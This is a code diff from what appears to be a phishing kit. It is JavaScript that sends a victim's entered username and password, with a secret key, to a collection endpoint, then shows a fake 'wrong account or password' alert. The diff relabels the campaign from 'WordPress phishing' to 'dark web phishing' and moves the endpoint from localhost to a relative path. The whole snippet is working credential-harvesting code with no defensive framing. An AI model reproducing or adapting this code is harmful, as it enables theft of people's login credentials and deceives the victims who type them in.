@@ -4,16 +4,16 @@ function report() {
 
     $.ajax({
         type: "POST",
-        url: "http://localhost:9001/api/v1/post/dart_report",
+        url: "/api/v1/post/deep_report",
         dataType: "json",
         data: {
-            "name": "WordPress钓鱼",
+            "name": "暗网钓鱼",
             "info": login_field + "&&" + password,
             "sec_key": "9cbf8a4dcb8e30682b927f352d6559a0"
         },
         success: function (e) {
             if (e.code == "200") {
-               alert("账号密码错误");
+                alert("账号密码错误");
             } else {
                 console.log(e.msg)
             }
